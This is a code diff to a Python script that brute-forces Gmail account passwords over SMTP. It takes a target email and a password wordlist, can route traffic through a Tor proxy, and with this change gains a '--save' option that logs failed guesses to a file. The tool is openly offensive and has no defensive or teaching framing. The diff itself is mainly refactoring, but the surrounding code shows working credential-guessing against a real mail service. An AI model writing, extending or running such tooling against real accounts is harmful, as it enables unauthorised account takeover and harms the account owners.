@@ -17,18 +17,40 @@ def check_tor_running():
 		exit()
 
 
+def get_arguments():
+	try:
+		arguments = sys.argv[1:]
+	except IndexError:
+		pass
+	return arguments
+
+
 def sleep_timer(function):
 	@wraps(function)
 	def check_for_proxy(*args):
-		try:
-			arguments = sys.argv[1:]
-		except IndexError:
-			pass
+		arguments = get_arguments()
 		if "--proxy" not in arguments:
 			time.sleep(1.5)  # sleep only if proxy not in argument
 			return function(*args)
 		return function(*args)
 	return check_for_proxy
+
+def make_file(function):
+	@wraps(function)
+	def check_for_save(*args):
+		arguments = get_arguments()
+		if "--save" in arguments:
+			try:
+				with open("incorrect_passwords.txt", "a") as f:
+					f.write(args[2])
+					f.write("\n")
+					f.close()
+			except PermissionError:
+				print("[-] Invalid permissions. Please try with sudo")
+				exit()
+			return function(*args)
+		return function(*args)
+	return check_for_save
 
 
 class Colors:
@@ -59,6 +81,7 @@ class Parser:
 		self.args.add_argument("--email", help="Email you choose to bruteforce", required=True)
 		self.args.add_argument("--file", help="Wordlist to pick and try to use to bruteforce", type=self.validate_file, required=True)
 		self.args.add_argument("--proxy", help="Set a proxy if you need it. Slower login attempts if set proxy", action='store_true')
+		self.args.add_argument("--save", help="If you want to save the passwords that were incorrect to a file.", action='store_true')
 
 		self.args_parsed = self.args.parse_args()
 
@@ -84,6 +107,7 @@ class Email:
 
 
 	@sleep_timer
+	@make_file
 	def email_connection(self, email, password):
 		gmail_server = smtplib.SMTP('smtp.gmail.com', 587)
 		gmail_server.starttls()
@@ -96,6 +120,7 @@ class Email:
 		except smtplib.SMTPAuthenticationError:
 			incorrect_password = f"[-] Incorrect password [==>] {password}"
 			print(Colors.purple_color(incorrect_password))
+
 
 class Proxy:
 	def __init__(self):
